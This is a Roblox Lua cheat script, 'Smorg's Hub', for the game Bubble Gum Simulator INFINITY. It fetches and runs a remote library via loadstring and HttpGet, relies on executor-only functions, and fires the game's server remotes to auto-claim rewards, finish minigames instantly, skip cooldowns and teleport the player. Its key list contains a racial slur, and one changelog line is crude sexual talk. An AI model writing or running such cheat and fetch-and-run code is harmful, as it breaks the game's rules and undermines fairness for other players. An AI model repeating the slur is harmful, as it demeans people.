if game.PlaceId ~= 85896571713843 then 
    game:GetService("Players").LocalPlayer:Kick("You're in the wrong game lmao.") 
    end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()


local Window = Rayfield:CreateWindow({
   Name = "Smorg's Hub | üêæ ‚òÅÔ∏è Bubble Gum Simulator INFINITY ‚ôæÔ∏è üåå",
   Icon = 101702832291512, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "üêæ‚òÅÔ∏èBGS INFINITY‚ôæÔ∏èüåå",
   LoadingSubtitle = "by Smorgasbord",
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = true,
   DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Smorg's Hub"
   },

   Discord = {
      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "zH2ax5ffbs", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Smorg's Hub",
      Subtitle = "Key System",
      Note = "Get the key from my discord server.", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"nigger"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Changelogs", "book-marked")

local Paragraph = Tab:CreateParagraph({Title = "üîî Updates! üîî", Content = "List of updates and changes"})

local Label = Tab:CreateLabel("May 7th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Auto Roll Dice ‚úÖ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Open Ticket Chest üéüÔ∏è ‚úÖ", "mailbox")
local Label = Tab:CreateLabel("Added Auto Purchase Dice Shop üé≤ ‚úÖ ", "store")
local Label = Tab:CreateLabel("Added More Teleport Options! ‚úÖ ", "tree-palm")
local Label = Tab:CreateLabel("Made The Teleports Better üõ†Ô∏è", "tree-palm")
local Label = Tab:CreateLabel("Auto Minigames", 4483362458)
local Label = Tab:CreateLabel("Added Auto Claw Machine üïπÔ∏è ‚úÖ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Cart Escape ‚õèÔ∏è ‚úÖ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Pet Match üÉè ‚úÖ", 4483362458)

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("May 4th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Auto Open Golden & Royal Chests ‚úÖ", "mailbox")
local Label = Tab:CreateLabel("Added Auto Open Mystery Boxes ‚úÖ", 4483362458)

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("May 1st 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Fixed Auto Collect Yet Aura Again üõ†Ô∏è", 4483362458)
local Label = Tab:CreateLabel("Added Auto Take Genie Quest ‚úÖ", 4483362458)
local Label = Tab:CreateLabel("Added Faster Egg Hatching ‚úÖ", "egg")
local Label = Tab:CreateLabel("More features soon!", 4483362458)

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 30th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Fixed Auto Collect Aura Again üõ†Ô∏è", 4483362458)
local Label = Tab:CreateLabel("Added 100M Egg To The Auto Hatcher ‚úÖ", "egg")
local Label = Tab:CreateLabel("Lots more features tommorow!", 4483362458)

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 24th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Fixed Auto Discover Islands üõ†Ô∏è", "tree-palm")
local Label = Tab:CreateLabel("Fixed Auto Hatch Eggs üõ†Ô∏è", "egg")
local Label = Tab:CreateLabel("Added Auto Hatch Rift Eggs ‚úÖ ", "globe")

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 19th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Fixed Auto Collect Aura üõ†Ô∏è", 4483362458)
local Label = Tab:CreateLabel("Added Teleport To Rifts Feature ‚úÖ ", "globe")
local Label = Tab:CreateLabel("Thats it lmaoo more soon cuz i gtg come inside a baddie", "store")

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 17th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Hide UI Toggle ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Added 3D Rendering Toggle ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Added Remove Hatching Animation ‚úÖ ", "egg")
local Label = Tab:CreateLabel("Added Auto Purchase Shop ‚úÖ ", "store")
local Label = Tab:CreateLabel("Added Hatch Notify Webhook ‚úÖ ", "bot-message-square")

local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 15th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Auto Claim Free Spin Ticket ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Spin Wheel ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Collect Playtime Rewards ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Added Auto Doggy Jump ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Fixed The Auto Collect Chests Feature üõ†Ô∏è", "mailbox")
local Label = Tab:CreateLabel("Discover Islands Feature Currently Bugged At The Moment üö®", "tree-palm", Color3.fromRGB(157, 0, 25), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Anti-Afk", "settings")


local Divider = Tab:CreateDivider()

local Label = Tab:CreateLabel("April 13th 2025", 101702832291512, Color3.fromRGB(157, 0, 255), false) -- Title, Icon, Color, IgnoreTheme
local Label = Tab:CreateLabel("Added Auto Collect Aura ‚úÖ ", 4483362458)
local Label = Tab:CreateLabel("Fixed Discover All Islands üõ†Ô∏è", "tree-palm")
local Label = Tab:CreateLabel("Chests Feature Currently Broken At The Moment üö®", "mailbox", Color3.fromRGB(157, 0, 25), false) -- Title, Icon, Color, IgnoreTheme

local Tab = Window:CreateTab("Main", 4483362458) -- Title, Image

local Section = Tab:CreateSection("Miscs")

local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local hudGui = playerGui:FindFirstChild("ScreenGui")

-- Make sure HUD exists before creating the toggle
if hudGui and hudGui:FindFirstChild("HUD") then
    local hud = hudGui.HUD
    hud.Visible = true -- default to visible

    local Toggle = Tab:CreateToggle({
        Name = "UI Toggle",
        CurrentValue = true,
        Flag = "HUDToggle",
        Callback = function(Value)
            hud.Visible = Value

            Rayfield:Notify({
                Title = "UI Toggle",
                Content = Value and "UI Enabled" or "UI Disabled",
                Duration = 6.5,
                Image = 101702832291512
            })
        end,
    })
end


local Toggle = Tab:CreateToggle({
    Name = "3D Rendering",
    CurrentValue = true,
    Flag = "3DRenderingToggle",
    Callback = function(Value)
        -- Toggle 3D Rendering based on toggle state
        game:GetService("RunService"):Set3dRenderingEnabled(Value)

        -- Send notification
        Rayfield:Notify({
            Title = "Rendering Toggled",
            Content = Value and "3D Rendering Enabled" or "3D Rendering Disabled",
            Duration = 6.5,
            Image = 101702832291512
        })
    end,
})

local afkEnabled = false

local Toggle = Tab:CreateToggle({
    Name = "Anti-AFK",
    CurrentValue = false,
    Flag = "AntiAFKToggle",
    Callback = function(Value)
        afkEnabled = Value

        if afkEnabled then
            Rayfield:Notify({
                Title = "Anti-AFK",
                Content = "Anti-AFK is now active!",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                while afkEnabled do
                    -- Simulate user input
                    local vu = game:GetService("VirtualUser")
                    game:GetService("Players").LocalPlayer.Idled:Connect(function()
                        vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                        task.wait(1)
                        vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                    end)
                    task.wait(10)
                end
            end)
        else
            Rayfield:Notify({
                Title = "Anti-AFK Disabled",
                Content = "You can go AFK now.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Blow")

local blowing = false
local bubbleThread

local Toggle = Tab:CreateToggle({
    Name = "Auto Blow Bubble",
    CurrentValue = false,
    Flag = "AutoBlowBubble",
    Callback = function(Value)
        blowing = Value

        if blowing then
            bubbleThread = task.spawn(function()
                while blowing do
                    local args = {
                        [1] = "BlowBubble"
                    }

                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                    task.wait(0.1) -- Adjust delay as needed
                end
            end)
            -- Show notification when Auto Blow Bubble is enabled using Rayfield
            Rayfield:Notify({
                Title = "Auto Blow Bubble",
                Content = "Auto Blow Bubble is now enabled!",
                Duration = 6.5,
                Image = 101702832291512 -- You can change this image ID as needed
            })
        else
            blowing = false
            if bubbleThread then
                task.cancel(bubbleThread)
            end
            -- Show notification when Auto Blow Bubble is disabled using Rayfield
            Rayfield:Notify({
                Title = "Auto Blow Bubble",
                Content = "Auto Blow Bubble is now disabled.",
                Duration = 6.5,
                Image = 101702832291512 -- You can change this image ID as needed
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Sell")

local Paragraph = Tab:CreateParagraph({Title = "INFO", Content = "Must be near selling place for this to work."})

local selling = false
local sellThread
local sellDelay = 0.5  -- Default delay

local Slider = Tab:CreateSlider({
    Name = "Auto Sell Delay (Seconds)",
    Range = {0.1, 60},
    Increment = 0.1,
    Suffix = "Seconds",
    CurrentValue = sellDelay,
    Flag = "AutoSellDelaySlider",
    Callback = function(Value)
        sellDelay = Value
    end,
})

local Toggle = Tab:CreateToggle({
    Name = "Auto Sell Bubble",
    CurrentValue = false,
    Flag = "AutoSellBubble",
    Callback = function(Value)
        selling = Value

        if selling then
            sellThread = task.spawn(function()
                while selling do
                    local args = {
                        [1] = "SellBubble"
                    }

                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                    task.wait(sellDelay)
                end
            end)

            -- Notification for enabling auto sell
            Rayfield:Notify({
                Title = "Auto Sell Bubble",
                Content = "Auto Sell Bubble is now enabled!",
                Duration = 6.5,
                Image = 101702832291512
            })
        else
            selling = false
            if sellThread then
                task.cancel(sellThread)
            end

            -- Notification for disabling auto sell
            Rayfield:Notify({
                Title = "Auto Sell Bubble",
                Content = "Auto Sell Bubble is now disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Collect")

-- Notification Script
local function Notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Auto-Collect Function
local function CollectPickups()
    for i, v in next, game:GetService("Workspace").Rendered:GetChildren() do
        if v.Name == "Chunker" then
            for i2, v2 in next, v:GetChildren() do
                local Part, HasMeshPart = v2:FindFirstChild("Part"), v2:FindFirstChildWhichIsA("MeshPart")
                local HasStars = Part and Part:FindFirstChild("Stars")
                local HasPartMesh = Part and Part:FindFirstChild("Mesh")
                if HasMeshPart or HasStars or HasPartMesh then
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Pickups"):WaitForChild("CollectPickup"):FireServer(v2.Name)
                    v2:Destroy()
                end
            end
        end
    end
end

-- Disable Idle Connections (for anti-idle)
for i, v in next, getconnections(game:GetService("Players").LocalPlayer.Idled) do
    v:Disable()
end

-- Flag to manage the auto-collect state
_G.autoCollectRunning = false

-- Toggle UI to Start/Stop Auto-Collect
local Toggle = Tab:CreateToggle({
    Name = "Auto Collect Pickups",
    CurrentValue = false,
    Flag = "Toggle_AutoCollect", -- Identifier for saving the state of the toggle
    Callback = function(Value)
        if Value then
            -- Enable Auto-Collect
            _G.autoCollectRunning = true
            Notify("Auto Collect Enabled", "The auto-collect feature is now running.")
            -- Start the collecting loop
            task.spawn(function()
                while _G.autoCollectRunning do
                    CollectPickups()
                    wait(0.5)  -- Collect every 3 seconds
                end
            end)
        else
            -- Disable Auto-Collect
            _G.autoCollectRunning = false
            Notify("Auto Collect Disabled", "The auto-collect feature has been stopped.")
        end
    end,
})

-- Make sure the toggle gets properly set when reloaded
Toggle.Set = function(self, newValue)
    self.CurrentValue = newValue
    self.Callback(newValue)
end

local Section = Tab:CreateSection("Auto Playtime Rewards")

local running = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Claim Playtime",
    CurrentValue = false,
    Flag = "AutoClaimPlaytime",
    Callback = function(Value)
        running = Value
        if running then
            Rayfield:Notify({
                Title = "Auto Claim Enabled",
                Content = "Claiming all playtime rewards...",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                local remote = game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Function
                while running do
                    for i = 1, 9 do
                        remote:InvokeServer("ClaimPlaytime", i)
                        task.wait(0.5)
                    end
                    task.wait(3) -- wait a bit before looping again
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Claim Disabled",
                Content = "Stopped claiming playtime rewards.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Doggy Jump Minigame")

local running = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Doggy Jump Win",
    CurrentValue = false,
    Flag = "AutoDoggyJumpWin",
    Callback = function(Value)
        running = Value
        if running then
            Rayfield:Notify({
                Title = "Auto Doggy Jump Started",
                Content = "Enabled",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                while running do
                    for i = 1, 3 do
                        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("DoggyJumpWin", i)
                        task.wait(0.5)
                    end
                    task.wait(3) -- wait before repeating
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Doggy Jump Stopped",
                Content = "Disabled",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Spin Wheel")

local wheel = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Claim Free Spin",
    CurrentValue = false,
    Flag = "AutoFreeWheelSpin",
    Callback = function(Value)
        wheel = Value
        if wheel then
            Rayfield:Notify({
                Title = "Auto Claim Free Spin",
                Content = "Enabled",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                while wheel do
                    local args = { "ClaimFreeWheelSpin" }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                    task.wait(1) -- adjust delay as needed
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Claim Free Spin",
                Content = "Disabled",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local spinning = false

local Toggle = Tab:CreateToggle({
    Name = "Auto Wheel Spin",
    CurrentValue = false,
    Flag = "AutoWheelSpin",
    Callback = function(Value)
        spinning = Value
        if spinning then
            Rayfield:Notify({
                Title = "Auto Wheel Spin",
                Content = "Enabled.",
                Duration = 6.5,
                Image = 101702832291512
            })

            task.spawn(function()
                while spinning do
                    local args = { "WheelSpin" }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Function:InvokeServer(unpack(args))
                    task.wait(5) -- adjust delay if needed
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Wheel Spin Stopped",
                Content = "Disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Gem Genie Quest")

local Toggle = Tab:CreateToggle({
    Name = "Auto Genie Quest",
    CurrentValue = false,
    Flag = "AutoGenieQuestToggle",
    Callback = function(Value)
        getgenv().Functions = getgenv().Functions or {}
        getgenv().Functions.AutoGenieQuest = Value

        Rayfield:Notify({
            Title = "Auto Genie Quest",
            Content = Value and "Enabled" or "Disabled",
            Duration = 5,
            Image = 101702832291512
        })

        if Value then
            task.spawn(function()
                while getgenv().Functions.AutoGenieQuest do
                    game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Event"):FireServer("StartGenieQuest", math.random(1, 3))
                    task.wait(150)
                end
            end)
        end
    end,
})

local Section = Tab:CreateSection("Auto Open Mystery Boxes")

local MysteryBoxToggle = Tab:CreateToggle({
    Name = "Auto Open Mystery Box",
    CurrentValue = false,
    Flag = "AutoOpenMysteryBox",
    Callback = function(Value)
        getgenv().Functions = getgenv().Functions or {}
        getgenv().Functions.AutoOpenMysteryBox = Value

        if Value then
            Rayfield:Notify({
                Title = "Mystery Box",
                Content = "Auto Mystery Box opening enabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        else
            Rayfield:Notify({
                Title = "Mystery Box",
                Content = "Auto Mystery Box opening disabled.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end

        task.spawn(function()
            while getgenv().Functions.AutoOpenMysteryBox do
                task.wait()

                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local RemoteEvent = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Event")

                RemoteEvent:FireServer("UseGift", "Mystery Box", 1)

                for _, gift in next, game:GetService("Workspace").Rendered.Gifts:GetChildren() do
                    RemoteEvent:FireServer("ClaimGift", gift.Name)
                    task.wait()
                    gift:Destroy()
                end
            end
        end)
    end
})

local Section = Tab:CreateSection("Auto Dice")

_G.rollDiceEnabled = false

local RollDiceToggle = Tab:CreateToggle({
    Name = "Auto Roll Dice",
    CurrentValue = false,
    Flag = "Toggle_RollDice",
    Callback = function(Value)
        _G.rollDiceEnabled = Value

        if Value then
            Rayfield:Notify({
                Title = "Auto Dice",
                Content = "Auto Roll Dice started.",
                Duration = 5,
                Image = 101702832291512
            })

            task.spawn(function()
                while _G.rollDiceEnabled do
                    local args1 = {
                        [1] = "RollDice",
                        [2] = "Dice"
                    }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Function:InvokeServer(unpack(args1))

                    task.wait(0.1)

                    local args2 = {
                        [1] = "ClaimTile"
                    }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(unpack(args2))

                    task.wait(0.1)
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Dice",
                Content = "Auto Roll Dice stopped.",
                Duration = 5,
                Image = 101702832291512
            })
        end
    end,
})

_G.goldenDiceEnabled = false

local GoldenDiceToggle = Tab:CreateToggle({
    Name = "Auto Roll Golden Dice",
    CurrentValue = false,
    Flag = "Toggle_GoldenDice",
    Callback = function(Value)
        _G.goldenDiceEnabled = Value

        if Value then
            Rayfield:Notify({
                Title = "Auto Golden Dice",
                Content = "Auto Roll Golden Dice started.",
                Duration = 5,
                Image = 101702832291512
            })

            task.spawn(function()
                while _G.goldenDiceEnabled do
                    local args1 = {
                        [1] = "RollDice",
                        [2] = "Golden Dice"
                    }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Function:InvokeServer(unpack(args1))

                    task.wait(0.1)
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Golden Dice",
                Content = "Auto Roll Golden Dice stopped.",
                Duration = 5,
                Image = 101702832291512
            })
        end
    end,
})

_G.giantDiceEnabled = false

local GiantDiceToggle = Tab:CreateToggle({
    Name = "Auto Roll Giant Dice",
    CurrentValue = false,
    Flag = "Toggle_GiantDice",
    Callback = function(Value)
        _G.giantDiceEnabled = Value

        if Value then
            Rayfield:Notify({
                Title = "Auto Giant Dice",
                Content = "Auto Roll Giant Dice started.",
                Duration = 5,
                Image = 101702832291512
            })

            task.spawn(function()
                while _G.giantDiceEnabled do
                    local args1 = {
                        [1] = "RollDice",
                        [2] = "Giant Dice"
                    }
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Function:InvokeServer(unpack(args1))

                    task.wait(0.1)
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Giant Dice",
                Content = "Auto Roll Giant Dice stopped.",
                Duration = 5,
                Image = 101702832291512
            })
        end
    end,
})

local Section = Tab:CreateSection("Auto Claw Machine")

-- Notification Helper
local function Notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Claw Grab Function
local function GrabClawItems()
    local player = game:GetService("Players").LocalPlayer
    if not player then return end

    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then return end

    local screenGui = playerGui:FindFirstChild("ScreenGui")
    if not screenGui then return end

    local foundItem = false

    for _, descendant in pairs(screenGui:GetDescendants()) do
        if descendant.Name:match("^ClawItem") then
            local uuid = descendant.Name:gsub("^ClawItem", "")
            if uuid and #uuid > 0 then
                game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("GrabMinigameItem", uuid)
                print("Grabbed ClawItem:", uuid)
                task.wait(1)
                foundItem = true
            end
        end
    end

    if not foundItem then
        -- Finish minigame
        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("FinishMinigame")
        task.wait(0.2)
        -- Skip cooldown
        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("SkipMinigameCooldown", "Robot Claw")
        task.wait(0.2)
        -- Start new minigame
        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer("StartMinigame", "Robot Claw", "Insane")
    end
end

-- Global Flag
_G.autoClawMachineRunning = false

-- Toggle UI
local AutoClawMachineToggle = Tab:CreateToggle({
    Name = "Auto Claw Machine",
    CurrentValue = false,
    Flag = "Toggle_AutoClawMachine",
    Callback = function(Value)
        _G.autoClawMachineRunning = Value

        if Value then
            Notify("Auto Claw Machine Enabled", "Auto Claw Machine is now running.")
            task.spawn(function()
                while _G.autoClawMachineRunning do
                    GrabClawItems()
                    task.wait(3)
                end
            end)
        else
            Notify("Auto Claw Machine Disabled", "Auto Claw Machine has been stopped.")
        end
    end,
})

-- Optional: Allow external setting
AutoClawMachineToggle.Set = function(self, newValue)
    self.CurrentValue = newValue
    self.Callback(newValue)
end

local Section = Tab:CreateSection("Auto Cart Escape")

-- Notification Helper
local function Notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Global Flag
_G.autoCartEscapeRunning = false

-- Toggle UI
local CartEscapeToggle = Tab:CreateToggle({
    Name = "Auto Cart Escape",
    CurrentValue = false,
    Flag = "Toggle_CartEscape",
    Callback = function(Value)
        _G.autoCartEscapeRunning = Value

        if Value then
            Notify("Auto Cart Escape Enabled", "Now running Cart Escape minigame repeatedly.")
            task.spawn(function()
                while _G.autoCartEscapeRunning do
                    -- Start Minigame
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(
                        "StartMinigame", "Cart Escape", "Insane"
                    )

                    task.wait(0.1)

                    -- Finish Minigame
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(
                        "FinishMinigame"
                    )

                    task.wait(0.1)
                end
            end)
        else
            Notify("Auto Cart Escape Disabled", "Stopped Cart Escape minigame automation.")
        end
    end,
})

-- Optional: Allow external setting
CartEscapeToggle.Set = function(self, newValue)
    self.CurrentValue = newValue
    self.Callback(newValue)
end

local Section = Tab:CreateSection("Auto Pet Match")

-- Notification Helper
local function Notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 6.5,
        Image = 101702832291512
    })
end

-- Global Flag
_G.autoPetMatchRunning = false

-- Toggle UI
local PetMatchToggle = Tab:CreateToggle({
    Name = "Auto Pet Match",
    CurrentValue = false,
    Flag = "Toggle_PetMatch",
    Callback = function(Value)
        _G.autoPetMatchRunning = Value

        if Value then
            Notify("Auto Pet Match Enabled", "Now running Pet Match minigame repeatedly.")
            task.spawn(function()
                while _G.autoPetMatchRunning do
                    -- Start Minigame
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(
                        "StartMinigame", "Pet Match", "Insane"
                    )

                    task.wait(3)

                    -- Finish Minigame
                    game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.Event:FireServer(
                        "FinishMinigame"
                    )

                    task.wait(0.1)
                end
            end)
        else
            Notify("Auto Pet Match Disabled", "Stopped Pet Match minigame automation.")
        end
    end,
})

-- Optional: External control
PetMatchToggle.Set = function(self, newValue)
    self.CurrentValue = newValue
    self.Callback(newValue)
end

local Tab = Window:CreateTab("Eggs", "egg") -- Title, Image

local Section = Tab:CreateSection("Faster Eggs (in beta)")

local Toggle = Tab:CreateToggle({
    Name = "Fast Hatch",
    CurrentValue = false,
    Flag = "FastHatchToggle",
    Callback = function(Value)
        getgenv().FastHatchEnabled = Value

        Rayfield:Notify({
            Title = "Fast Hatch",
            Content = Value and "Fast Hatch Enabled" or "Fast Hatch Disabled",
            Duration = 5,
            Image = 101702832291512
        })

        if Value then
            task.spawn(function()
                while getgenv().FastHatchEnabled do
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.R, false, game)
                    task.wait()
                    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.R, false, game)
                end
            end)
        end
    end,
})

local Section = Tab:CreateSection("Hatching Animation")

local Button = Tab:CreateButton({
   Name = "Remove Hatching Animation",
   Callback = function()
    local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local hatchingGui = playerGui:FindFirstChild("ScreenGui")

    if hatchingGui and hatchingGui:FindFirstChild("Hatching") then
    hatchingGui.Hatching:Destroy()
end
    Rayfield:Notify({
        Title = "Hatching Animation",
        Content = "Succesfully Removed.",
        Duration = 6.5,
        Image = 101702832291512
    })

   end,
})


local Section = Tab:CreateSection("Egg Hatcher")

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Variables
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")

-- Egg position data
local eggPositions = {
    ["Infinity Egg"] = Vector3.new(-98.597, 8.6, -26.895),
    ["100M Egg"] = Vector3.new(16.24201202392578, 9.53238582611084, -4.528313636779785),
    ["Rainbow Egg"] = Vector3.new(-36.244, 15972.725, 44.744),
    ["Nightmare Egg"] = Vector3.new(-17.774, 10148.114, 186.326),
    ["Hell Egg"] = Vector3.new(-7.037, 10148.104, 192.543),
    ["Void Egg"] = Vector3.new(4.876, 10148.104, 188.034),
    ["Lunar Egg"] = Vector3.new(-57.772, 6862.936, 78.454),
    ["Crystal Egg"] = Vector3.new(-19.196, 2665.466, 18.940),
    ["Magma Egg"] = Vector3.new(-18.707, 2665.466, 8.157),
    ["Spikey Egg"] = Vector3.new(-6.972, 423.232, 157.938),
    ["Iceshard Egg"] = Vector3.new(-8.218, 9.6, -59.531),
    ["Spotted Egg"] = Vector3.new(-8.588, 9.6, -70.956),
    ["Common Egg"] = Vector3.new(-8.745, 9.6, -81.669),
}

local eggNames = {}
for name, _ in pairs(eggPositions) do
    table.insert(eggNames, name)
end

local selectedEgg = "None"
local hatchAmount = 1
local autoHatchEnabled = false

-- Dropdown for egg selection
local Dropdown = Tab:CreateDropdown({
    Name = "Select Egg",
    Options = eggNames,
    CurrentOption = {"None"},
    MultipleOptions = false,
    Flag = "EggSelector",
    Callback = function(Options)
        selectedEgg = Options[1]
        if eggPositions[selectedEgg] then
            Rayfield:Notify({
                Title = "Egg Selected",
                Content = selectedEgg .. " found.",
                Duration = 6.5,
                Image = 101702832291512
            })
        else
            Rayfield:Notify({
                Title = "Error",
                Content = selectedEgg .. " not found.",
                Duration = 6.5,
                Image = 101702832291512
            })
        end
    end,
})

-- Hatch amount dropdown
local HatchAmountDropdown = Tab:CreateDropdown({
    Name = "Hatch Amount",
    Options = {"1", "2", "3", "4", "5", "6"},
    CurrentOption = {"1"},
    MultipleOptions = false,
    Flag = "HatchAmountSelector",
    Callback = function(Options)
        hatchAmount = tonumber(Options[1])
    end,
})

-- Auto hatch toggle
local Toggle = Tab:CreateToggle({
    Name = "Auto Hatch",
    CurrentValue = false,
    Flag = "AutoHatchToggle",
    Callback = function(Value)
        autoHatchEnabled = Value
        if autoHatchEnabled and selectedEgg ~= "None" and eggPositions[selectedEgg] then
            task.spawn(function()
                while autoHatchEnabled do
                    local pos = eggPositions[selectedEgg]
                    if (hrp.Position - pos).Magnitude > 5 then
                        TweenService:Create(
                            hrp,
                            TweenInfo.new(10, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
                            {CFrame = CFrame.new(pos + Vector3.new(0, 5, 0))}
                        ):Play()
                        repeat task.wait() until (hrp.Position - pos).Magnitude <= 5 or not autoHatchEnabled
                    end

                    local args = {
                        [1] = "HatchEgg",
                        [2] = selectedEgg,
                        [3] = hatchAmount
                    }
                    ReplicatedStorage.Shared.Framework.Network.Remote.Event:FireServer(unpack(args))
                    task.wait(1.5)
                end
            end)
        end
    end,
})


